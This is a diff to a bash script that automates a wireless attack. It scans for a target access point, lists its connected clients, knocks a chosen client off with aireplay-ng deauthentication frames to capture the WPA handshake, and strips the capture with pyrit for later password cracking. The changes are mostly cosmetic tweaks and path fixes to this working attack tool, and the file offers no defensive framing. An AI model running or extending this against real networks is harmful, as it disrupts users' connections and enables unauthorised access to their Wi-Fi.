@@ -20,11 +20,11 @@ fapscan()
 				
 				if [ $(cat tmp3.csv | grep $ESSID | cut -c 2) = "," ]
 					then
-						CHAN=$(cat tmp3.csv | grep $ESSID | cut -c 1)
+						CHAN=$(cat $HOME/tmp3.csv | grep $ESSID | cut -c 1)
 					else
-						CHAN=$(cat tmp3.csv | grep $ESSID | cut -c 1-2)
+						CHAN=$(cat $HOME/tmp3.csv | grep $ESSID | cut -c 1-2)
 				fi
-				BSSID=$(cat tmp4.csv | grep $ESSID | cut -c 1-17)
+				BSSID=$(cat $HOME/tmp4.csv | grep $ESSID | cut -c 1-17)
 				fclientscan
 		fi
 		sleep $SLP
@@ -44,6 +44,10 @@ fclientscan()
 	rm -rf $HOME/tmp* 2> /dev/null
 	CNT="0"
 	clear
+	if [ ${CHAN:1:1} = "," ] 2> /dev/null
+		then
+			CHAN=${CHAN:0:1}
+	fi
 	$COLOR 2;echo " [*] AP Found BSSID: $BSSID CHANNEL: $CHAN"
 	$COLOR 4;echo ' [*] Please wait while I gather active stations.. [*]';$COLOR 9
 	gnome-terminal --geometry=130x20 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w $HOME/tmp1&
@@ -72,7 +76,6 @@ fclientscan()
 		done < $HOME/tmp1
 	if [ $CNT -lt 1 ]
 		then
-			echo
 			$COLOR 1;echo " [*] No Clients found, retrying... [*]";$COLOR 9
 			sleep 1
 			fclientscan
@@ -91,7 +94,7 @@ fcap()
 			$COLOR 2;echo " [*] $CNT active clients found:";$COLOR 9
 			cat $HOME/tmp1
 			echo
-			$COLOR 4;echo " [*] Please paste clent MAC or Press Enter to use first one:";$COLOR 9 
+			$COLOR 4;echo " [*] Please paste clent MAC or Press Enter to use the first one:";$COLOR 9 
 			read -p "  >" CLIE
 	fi
 	if [ $CLIE -z ] 2> /dev/null
@@ -113,24 +116,26 @@ fcap()
 			$COLOR 4;read -p " [*] was the hanshake successfully captured? [Y/n]: " WASCAP;$COLOR 9
 			if [ $WASCAP = "n" ] 2> /dev/null
 				then
-					aireplay-ng -0 1 -a $BSSID -c $CLIE mon0
-					sleep 4
+					clear
+					$COLOR 1; echo " [*] DEAUTHING $CLIE";$COLOR 9
+					echo
+					$COLOR 1;aireplay-ng -0 1 -a $BSSID -c $CLIE mon0;$COLOR 9
+					sleep 3
 				else
 					killall airodump-ng
 					break
 			fi
 		done
 	echo
-	$COLOR 2;echo "[*] Saving and Stripping capture, please wait... [*]";$COLOR 9
+	$COLOR 4;echo "[*] Saving and Stripping capture, please wait... [*]"
 	echo
-	pyrit -r "$HOME"/Desktop/hs/"$FILENAME"-01.cap -o "$HOME"/Desktop/hs/$FILENAME2 strip
-	clear
+	pyrit -r "$HOME"/Desktop/hs/"$FILENAME"-01.cap -o "$HOME"/Desktop/hs/$FILENAME2 strip;$COLOR 9
 	rm "$HOME"/Desktop/hs/"$FILENAME"-01.cap
 	airmon-ng stop mon0&
 	rm -rf $HOME/tmp*
 	ISGOOD=$(pyrit -r "$HOME"/Desktop/hs/$FILENAME2 analyze | grep good)
 	
-	if [ ${ISGOOD:0:5} = '#' ]
+	if [ ${ISGOOD:0:5} = '#' ] 2> /dev/null
 		then
 			clear
 			$COLOR 2;echo " [*] Handshake capture was successful!, Horray for you";$COLOR 9
